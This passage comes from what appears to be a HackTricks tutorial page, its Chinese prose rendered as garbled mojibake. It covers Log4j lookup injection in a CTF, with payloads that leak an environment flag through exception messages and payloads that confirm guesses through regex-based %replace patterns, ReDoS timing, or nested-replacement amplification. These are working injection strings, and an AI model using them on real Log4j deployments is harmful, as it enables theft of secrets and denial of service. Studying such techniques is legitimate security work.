<p>åœ¨ CTF ä¸­ï¼Œä½  <strong>æ— æ³•è®¿é—® java åº”ç”¨ç¨‹åºçš„ stderr</strong>ï¼Œä½¿ç”¨ log4Jï¼Œä½† Log4J <strong>å¼‚å¸¸ä¼šå‘é€åˆ° stdout</strong>ï¼Œè¿™åœ¨ python åº”ç”¨ç¨‹åºä¸­è¢«æ‰“å°ã€‚è¿™æ„å‘³ç€è§¦å‘å¼‚å¸¸æ—¶æˆ‘ä»¬å¯ä»¥è®¿é—®å†…å®¹ã€‚æå–æ ‡å¿—çš„å¼‚å¸¸æ˜¯ï¼š<strong><code>${java:${env:FLAG}}</code></strong>ã€‚è¿™æœ‰æ•ˆæ˜¯å› ä¸º <strong><code>${java:CTF{blahblah}}</code></strong> ä¸å­˜åœ¨ï¼Œå¼‚å¸¸çš„å€¼å°†æ˜¾ç¤ºæ ‡å¿—ï¼š</p>
<p><img src="../../.gitbook/assets/image%20(1023).png" alt="" /></p>
<h3 id="conversion-patterns-exceptions"><a class="header" href="#conversion-patterns-exceptions">Conversion Patterns Exceptions</a></h3>
<p>ä»…æåŠï¼Œä½ è¿˜å¯ä»¥æ³¨å…¥æ–°çš„ <a href="https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout"><strong>è½¬æ¢æ¨¡å¼</strong></a> å¹¶è§¦å‘å°†è¢«è®°å½•åˆ° <code>stdout</code> çš„å¼‚å¸¸ã€‚ä¾‹å¦‚ï¼š</p>
<p><img src="../../.gitbook/assets/image%20(683).png" alt="" /></p>
<p>è¿™åœ¨æå–é”™è¯¯æ¶ˆæ¯ä¸­çš„æ•°æ®æ—¶å¹¶æ²¡æœ‰è¢«å‘ç°æœ‰ç”¨ï¼Œå› ä¸ºæŸ¥æ‰¾åœ¨è½¬æ¢æ¨¡å¼ä¹‹å‰æ²¡æœ‰è§£å†³ï¼Œä½†å®ƒå¯èƒ½å¯¹å…¶ä»–äº‹æƒ…å¦‚æ£€æµ‹æœ‰ç”¨ã€‚</p>
<h3 id="conversion-patterns-regexes"><a class="header" href="#conversion-patterns-regexes">Conversion Patterns Regexes</a></h3>
<p>ç„¶è€Œï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº› <strong>æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼çš„è½¬æ¢æ¨¡å¼</strong> é€šè¿‡ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å’Œæ»¥ç”¨ <strong>äºŒåˆ†æŸ¥æ‰¾</strong> æˆ– <strong>åŸºäºæ—¶é—´</strong> çš„è¡Œä¸ºæ¥æå–ä¿¡æ¯ã€‚</p>
<ul>
<li><strong>é€šè¿‡å¼‚å¸¸æ¶ˆæ¯è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾</strong></li>
</ul>
<p>è½¬æ¢æ¨¡å¼ <strong><code>%replace</code></strong> å¯ä»¥ç”¨æ¥ <strong>æ›¿æ¢</strong> <strong>å­—ç¬¦ä¸²</strong> ä¸­çš„ <strong>å†…å®¹</strong>ï¼Œç”šè‡³ä½¿ç”¨ <strong>æ­£åˆ™è¡¨è¾¾å¼</strong>ã€‚å®ƒçš„å·¥ä½œæ–¹å¼æ˜¯ï¼š<code>replace{pattern}{regex}{substitution}</code><br />
æ»¥ç”¨è¿™ç§è¡Œä¸ºï¼Œä½ å¯ä»¥ä½¿æ›¿æ¢ <strong>åœ¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å­—ç¬¦ä¸²ä¸­çš„ä»»ä½•å†…å®¹æ—¶è§¦å‘å¼‚å¸¸</strong>ï¼ˆå¦‚æœæœªæ‰¾åˆ°åˆ™ä¸è§¦å‘å¼‚å¸¸ï¼‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="language-bash">%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
</code></pre>
<ul>
<li><strong>åŸºäºæ—¶é—´çš„</strong></li>
</ul>
<p>æ­£å¦‚å‰ä¸€èŠ‚æ‰€æåˆ°çš„ï¼Œ<strong><code>%replace</code></strong> æ”¯æŒ <strong>regexes</strong>ã€‚å› æ­¤ï¼Œå¯ä»¥ä½¿ç”¨æ¥è‡ª <a href="../regular-expression-denial-of-service-redos.html"><strong>ReDoS é¡µé¢</strong></a> çš„æœ‰æ•ˆè½½è·æ¥å¯¼è‡´ <strong>è¶…æ—¶</strong>ï¼Œå¦‚æœæ‰¾åˆ°æ ‡å¿—ã€‚<br />
ä¾‹å¦‚ï¼Œåƒ <code>%replace{${env:FLAG}}{^(?=CTF)((.</code><em><code>)</code></em><code>)*salt$}{asd}</code> çš„æœ‰æ•ˆè½½è·å°†åœ¨è¯¥ CTF ä¸­è§¦å‘ <strong>è¶…æ—¶</strong>ã€‚</p>
<p>åœ¨è¿™ä¸ª <a href="https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/"><strong>å†™ä½œ</strong></a> ä¸­ï¼Œä½¿ç”¨äº† <strong>æ”¾å¤§æ”»å‡»</strong> è€Œä¸æ˜¯ ReDoS æ”»å‡»æ¥é€ æˆå“åº”ä¸­çš„æ—¶é—´å·®ï¼š</p>
<blockquote>
<pre><code>/%replace{
%replace{
%replace{
%replace{
%replace{
%replace{
%replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
</code></pre>
<p>å¦‚æœæ ‡å¿—ä»¥ <code>flagGuess</code> å¼€å¤´ï¼Œåˆ™æ•´ä¸ªæ ‡å¿—å°†è¢« 29 ä¸ª <code>#</code> æ›¿æ¢ï¼ˆæˆ‘ä½¿ç”¨è¿™ä¸ªå­—ç¬¦æ˜¯å› ä¸ºå®ƒå¯èƒ½ä¸ä¼šæ˜¯æ ‡å¿—çš„ä¸€éƒ¨åˆ†ï¼‰ã€‚<strong>ç„¶åå°†ç»“æœä¸­çš„æ¯ä¸ª 29 ä¸ª <code>#</code> æ›¿æ¢ä¸º 54 ä¸ª <code>#</code></strong>ã€‚è¿™ä¸ªè¿‡ç¨‹é‡å¤ <strong>6 æ¬¡</strong>ï¼Œå¯¼è‡´æ€»å…± <code>29*54*54^6* =`` ``</code><strong><code>96816014208</code></strong> <strong><code>#</code>ï¼</strong></p>
<p>æ›¿æ¢å¦‚æ­¤å¤šçš„ <code>#</code> å°†è§¦å‘ Flask åº”ç”¨ç¨‹åºçš„ 10 ç§’è¶…æ—¶ï¼Œè¿™å°†å¯¼è‡´ HTTP çŠ¶æ€ä»£ç  500 è¢«å‘é€ç»™ç”¨æˆ·ã€‚ï¼ˆå¦‚æœæ ‡å¿—ä¸ä»¥ <code>flagGuess</code> å¼€å¤´ï¼Œæˆ‘ä»¬å°†æ”¶åˆ°é 500 çŠ¶æ€ä»£ç ï¼‰</p>
</blockquote>
<h2 id="å‚è€ƒæ–‡çŒ®"><a class="header" href="#å‚è€ƒæ–‡çŒ®">å‚è€ƒæ–‡çŒ®</a></h2>
<ul>
<li><a href="https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/">https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/</a></li>
<li><a href="https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/">https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/</a></li>
<li><a href="https://www.youtube.com/watch?v=XG14EstTgQ4">https://www.youtube.com/watch?v=XG14EstTgQ4</a></li>
<li><a href="https://tryhackme.com/room/solar">https://tryhackme.com/room/solar</a></li>
<li><a href="https://www.youtube.com/watch?v=Y8a5nB-vy78">https://www.youtube.com/watch?v=Y8a5nB-vy78</a></li>
<li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></li>
<li><a href="https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/">https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/</a></li>
<li><a href="https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/">https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/</a></li>
</ul>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨ Twitter ä¸Šå…³æ³¨</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentesting-web/deserialization/python-yaml-deserialization.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../pentesting-web/deserialization/ruby-class-pollution.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentesting-web/deserialization/python-yaml-deserialization.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../pentesting-web/deserialization/ruby-class-pollution.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
